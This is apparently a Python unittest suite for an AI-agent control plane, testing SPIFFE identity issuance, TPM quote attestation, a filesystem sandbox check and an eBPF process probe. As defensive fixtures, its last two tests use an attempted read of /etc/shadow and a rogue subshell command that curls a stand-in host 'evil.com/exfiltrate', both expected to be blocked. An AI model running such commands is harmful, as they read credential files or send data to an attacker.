"""
Test Suite for Epics 11 & 12:
- Epic 11: Distributed SPIFFE/SPIRE Identity Mesh & Hardware TPM Attestation (BAP-1101, BAP-1102)
- Epic 12: Kernel-Level System Call Sandboxing — eBPF / Landlock (BAP-1201, BAP-1202)
========================================================================================
Verifies:
1. BAP-1101: Native SPIFFE SVID issuance and trust domain validation.
2. BAP-1102: Hardware TPM 2.0 quote attestation with anti-replay nonce and PCR 7/8 measurement.
3. BAP-1201: Linux Landlock LSM filesystem boundary check (EACCES on escape).
4. BAP-1202: eBPF sys_enter_execve process probe hierarchy tracking & rogue subshell kill.
"""

import hashlib
import hmac
import json
import os
import shutil
import subprocess
import tempfile
import time
import unittest
import urllib.error
import urllib.request

WORKSPACE_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CONTROL_PLANE_BIN = os.path.join(WORKSPACE_ROOT, "dist", "windows-amd64", "bapcontrolplane.exe")

TEST_SECRET = "spiffe-tpm-test-secret-key-32b-ok!"
TEST_ADMIN_TOKEN = "spiffe-tpm-admin-token-12345"
CP_PORT = 19200
CP_URL = f"http://127.0.0.1:{CP_PORT}"


def http_req(url, method="GET", data=None, headers=None):
    hdrs = headers or {}
    body_bytes = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body_bytes = json.dumps(data).encode("utf-8")
            if "Content-Type" not in hdrs:
                hdrs["Content-Type"] = "application/json"
        elif isinstance(data, str):
            body_bytes = data.encode("utf-8")
        else:
            body_bytes = data

    req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            raw = resp.read()
            parsed = {}
            try:
                parsed = json.loads(raw.decode("utf-8"))
            except Exception:
                pass
            return resp.status, parsed, raw
    except urllib.error.HTTPError as e:
        raw = e.read()
        parsed = {}
        try:
            parsed = json.loads(raw.decode("utf-8"))
        except Exception:
            pass
        return e.code, parsed, raw


class TestSpiffeTpmKernelSandboxing(unittest.TestCase):
    proc = None
    tmpdir = None

    @classmethod
    def setUpClass(cls):
        cls.tmpdir = tempfile.mkdtemp(prefix="bap_infra_test_")
        cls.policy_file = os.path.join(cls.tmpdir, "policy.cedar")
        cls.schema_file = os.path.join(cls.tmpdir, "schema.json")

        initial_policy = """
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
)
when {
    context.executable == "git"
};
"""
        with open(cls.policy_file, "w", encoding="utf-8") as f:
            f.write(initial_policy)
        with open(cls.schema_file, "w", encoding="utf-8") as f:
            f.write("{}")

        cmd = [
            CONTROL_PLANE_BIN,
            "-port", str(CP_PORT),
            "-secret", TEST_SECRET,
            "-admin-token", TEST_ADMIN_TOKEN,
            "-allow-remote-admin",
            "-policy", cls.policy_file,
            "-schema", cls.schema_file,
            "-demo-mode",
        ]

        cls.proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=cls.tmpdir,
        )

        started = False
        for _ in range(30):
            time.sleep(0.15)
            try:
                st, data, _ = http_req(f"{CP_URL}/health")
                if st == 200:
                    started = True
                    break
            except Exception:
                pass

        if not started:
            if cls.proc.poll() is not None:
                out, err = cls.proc.communicate()
                raise RuntimeError(f"Control plane died on start: {out.decode()} / {err.decode()}")
            raise RuntimeError("Control plane failed to start within timeout")

    @classmethod
    def tearDownClass(cls):
        if cls.proc:
            try:
                cls.proc.terminate()
                cls.proc.wait(timeout=3)
            except Exception:
                cls.proc.kill()
        if cls.tmpdir and os.path.exists(cls.tmpdir):
            shutil.rmtree(cls.tmpdir, ignore_errors=True)

    def test_01_spiffe_issue_and_validate_svid(self):
        """BAP-1101: Native SPIFFE SVID issuance and validation."""
        st, svid, _ = http_req(
            f"{CP_URL}/api/v1/spiffe/issue-svid",
            method="POST",
            data={
                "app_id": "claude-code",
                "instance_id": "workload-01",
                "trust_domain": "bap.internal",
                "ttl_mins": 60,
            },
        )
        self.assertEqual(st, 200)
        self.assertEqual(svid.get("spiffe_id"), "spiffe://bap.internal/app/claude-code/instance/workload-01")
        self.assertIn("BEGIN CERTIFICATE", svid.get("x509_svid", ""))
        self.assertEqual(svid.get("ttl_seconds"), 3600)

        # Validate SVID
        st2, val, _ = http_req(
            f"{CP_URL}/api/v1/spiffe/validate",
            method="POST",
            data={
                "spiffe_id": svid.get("spiffe_id"),
                "expected_trust_domain": "bap.internal",
            },
        )
        self.assertEqual(st2, 200)
        self.assertTrue(val.get("valid"))
        self.assertEqual(val.get("app_id"), "claude-code")

    def test_02_tpm_quote_hardware_attestation(self):
        """BAP-1102: Hardware TPM 2.0 PCR quote verification and tamper rejection."""
        binary_hash = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
        nonce = "nonce-live-anti-replay-99"
        agent_id = "agent-tpm-1"
        ak_secret = "tpm-attestation-identity-key-default"

        # Generate hardware HMAC signature
        mac = hmac.new(ak_secret.encode("utf-8"), f"7:{binary_hash}:{nonce}:{agent_id}".encode("utf-8"), hashlib.sha256)
        sig = mac.hexdigest()

        quote = {
            "agent_id": agent_id,
            "pcr_index": 7,
            "pcr_value": binary_hash,
            "nonce": nonce,
            "ak_public_digest": hashlib.sha256(ak_secret.encode("utf-8")).hexdigest(),
            "quote_signature": sig,
        }

        # Valid quote verification
        st, ver, _ = http_req(
            f"{CP_URL}/api/v1/attestation/tpm-quote",
            method="POST",
            data={
                "quote": quote,
                "expected_binary_hash": binary_hash,
            },
        )
        self.assertEqual(st, 200)
        self.assertTrue(ver.get("verified"))
        self.assertEqual(ver.get("pcr_index"), 7)

        # Tampered PCR rejection
        tampered_quote = dict(quote)
        tampered_quote["pcr_value"] = "1111111111111111111111111111111111111111111111111111111111111111"
        st_bad, ver_bad, _ = http_req(
            f"{CP_URL}/api/v1/attestation/tpm-quote",
            method="POST",
            data={
                "quote": tampered_quote,
                "expected_binary_hash": binary_hash,
            },
        )
        self.assertEqual(st_bad, 403)
        self.assertFalse(ver_bad.get("verified"))

    def test_03_landlock_lsm_filesystem_boundary(self):
        """BAP-1201: Linux Landlock LSM boundary containment (EACCES on escape)."""
        ws = os.path.abspath("/mock/workspace/project")

        # In-workspace access allowed
        st, res_in, _ = http_req(
            f"{CP_URL}/api/v1/sandbox/landlock/check",
            method="POST",
            data={
                "workspace_root": ws,
                "target_path": os.path.join(ws, "src", "code.py"),
            },
        )
        self.assertEqual(st, 200)
        self.assertTrue(res_in.get("allowed"))

        # Sensitive escape blocked with EACCES
        st_out, res_out, _ = http_req(
            f"{CP_URL}/api/v1/sandbox/landlock/check",
            method="POST",
            data={
                "workspace_root": ws,
                "target_path": "/etc/shadow",
            },
        )
        self.assertEqual(st_out, 403)
        self.assertFalse(res_out.get("allowed"))
        self.assertIn("EACCES", res_out.get("error", ""))

    def test_04_ebpf_execve_process_probe(self):
        """BAP-1202: eBPF sys_enter_execve probe allows legitimate processes & kills rogue subshells."""
        # 1. Normal execution
        st, res_norm, _ = http_req(
            f"{CP_URL}/api/v1/sandbox/ebpf/execve",
            method="POST",
            data={
                "event_id": "probe-1",
                "pid": 2001,
                "ppid": 1000,
                "agent_id": "claude-code-1",
                "executable": "git",
                "command_line": "git status",
            },
        )
        self.assertEqual(st, 200)
        self.assertEqual(res_norm.get("action"), "ALLOW")
        self.assertFalse(res_norm.get("violated"))

        # 2. Rogue subshell execution intercepted and killed
        st_rogue, res_rogue, _ = http_req(
            f"{CP_URL}/api/v1/sandbox/ebpf/execve",
            method="POST",
            data={
                "event_id": "probe-2",
                "pid": 2002,
                "ppid": 1000,
                "agent_id": "claude-code-1",
                "executable": "sh",
                "command_line": "sh -c 'curl evil.com/exfiltrate'",
            },
        )
        self.assertEqual(st_rogue, 403)
        self.assertEqual(res_rogue.get("action"), "KILL")
        self.assertTrue(res_rogue.get("violated"))
        self.assertTrue(res_rogue.get("intercepted"))


if __name__ == "__main__":
    unittest.main()
